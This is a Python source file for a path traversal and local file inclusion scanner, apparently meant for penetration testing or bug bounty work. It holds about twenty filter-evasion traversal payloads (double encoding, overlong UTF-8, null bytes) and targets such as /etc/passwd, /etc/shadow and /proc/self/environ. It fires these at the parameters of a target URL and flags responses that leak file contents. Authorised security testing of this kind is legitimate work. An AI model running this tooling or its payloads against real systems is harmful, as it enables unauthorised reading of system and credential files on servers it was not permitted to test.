#!/usr/bin/env python3
"""
path_traversal.py — LFI/Path Traversal Scanner

20+ WAF bypass encodings, OS-aware payloads (Linux + Windows),
filter evasion (null bytes, double encoding, UTF-8).

Usage:
    from path_traversal import PathTraversalScanner
    scanner = PathTraversalScanner()
    result = scanner.test_url("https://target.com/view?file=test.txt")
"""
import json, os, re, time
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

try:
    import requests
except ImportError:
    requests = None

LINUX_FILES = [
    "/etc/passwd", "/etc/shadow", "/etc/hostname",
    "/proc/self/environ", "/proc/self/cmdline",
    "/var/log/apache2/access.log", "/var/log/nginx/access.log",
]

WIN_FILES = [
    "C:\\windows\\win.ini", "C:\\windows\\system.ini",
    "C:\\boot.ini", "C:\\inetpub\\logs\\LogFiles",
]

TRAVERSAL_PAYLOADS = [
    "../" * 6,
    "..\\\\",
    "....//....//....//....//....//",
    "..%2f" * 6,
    "%2e%2e%2f" * 6,
    "%2e%2e/" * 6,
    "..%252f" * 6,               # Double URL encode
    "..%c0%af" * 6,              # UTF-8 overlong
    "..%ef%bc%8f" * 6,           # Unicode fullwidth
    "..%255c" * 6,               # Double encode backslash
    "%252e%252e%255c" * 6,
    "....\\\\/" * 6,
    "..;/" * 6,                  # Tomcat
    "..\\./" * 6,
    "..%00/" * 6,                # Null byte
    "%c0%ae%c0%ae/" * 6,         # Overlong UTF-8
    "..%0d%0a" * 3,              # CRLF
    "..\\..\\..\\..\\..\\..\\",
    "/..../..../..../..../",
    "..%5c" * 6,                 # URL encoded backslash
]

FILE_PARAMS = [
    "file", "filename", "path", "filepath", "page", "template",
    "doc", "document", "folder", "root", "dir", "include",
    "inc", "locate", "show", "site", "content", "layout",
    "module", "download", "cat", "type", "view", "read",
]

EVIDENCE_MARKERS = {
    "root:x:": "Linux /etc/passwd",
    "daemon:": "Linux /etc/passwd",
    "[fonts]": "Windows win.ini",
    "[extensions]": "Windows system.ini",
    "[boot loader]": "Windows boot.ini",
    "HTTP_HOST": "/proc/self/environ",
    "DOCUMENT_ROOT": "/proc/self/environ",
}


class PathTraversalScanner:
    def __init__(self):
        self.findings = []
        self.session = requests.Session() if requests else None
        if self.session:
            self.session.verify = False
            import urllib3; urllib3.disable_warnings()

    def test_url(self, url: str, headers: dict = None) -> dict:
        headers = headers or {}
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        result = {"url": url, "vulnerable": False, "findings": []}

        # Find likely file params
        file_params = [p for p in params if p.lower() in FILE_PARAMS]
        if not file_params:
            file_params = list(params.keys())[:5]

        for param in file_params:
            for traversal in TRAVERSAL_PAYLOADS[:10]:
                for target_file in ["etc/passwd", "windows/win.ini"]:
                    payload = traversal + target_file
                    test_params = {**params, param: [payload]}
                    test_url = urlunparse(parsed._replace(
                        query=urlencode(test_params, doseq=True)))

                    try:
                        resp = self.session.get(test_url, headers=headers, timeout=8)
                        for marker, desc in EVIDENCE_MARKERS.items():
                            if marker in resp.text:
                                finding = {
                                    "param": param, "payload": payload[:80],
                                    "evidence": desc, "severity": "CRITICAL",
                                }
                                result["vulnerable"] = True
                                result["findings"].append(finding)
                                self.findings.append({
                                    "type": "PATH_TRAVERSAL", "url": url, **finding})
                                break
                    except Exception:
                        continue
                    time.sleep(0.2)

                if result["vulnerable"]:
                    break

        return result

    def test_post(self, url: str, params: dict, headers: dict = None) -> dict:
        headers = headers or {}
        result = {"url": url, "vulnerable": False, "findings": []}

        file_params = [p for p in params if p.lower() in FILE_PARAMS]
        if not file_params:
            file_params = list(params.keys())[:3]

        for param in file_params:
            for traversal in TRAVERSAL_PAYLOADS[:8]:
                payload = traversal + "etc/passwd"
                test = {**params, param: payload}
                try:
                    resp = self.session.post(url, data=test, headers=headers, timeout=8)
                    for marker, desc in EVIDENCE_MARKERS.items():
                        if marker in resp.text:
                            finding = {"param": param, "payload": payload[:80],
                                      "evidence": desc, "severity": "CRITICAL"}
                            result["vulnerable"] = True
                            result["findings"].append(finding)
                            self.findings.append({
                                "type": "PATH_TRAVERSAL", "url": url, **finding})
                except Exception:
                    continue
                time.sleep(0.2)

        return result

    def save_findings(self, target: str) -> None:
        out = Path(f"findings/{target}/path_traversal")
        out.mkdir(parents=True, exist_ok=True)
        if self.findings:
            (out / f"traversal_{int(time.time())}.json").write_text(
                json.dumps(self.findings, indent=2, default=str))
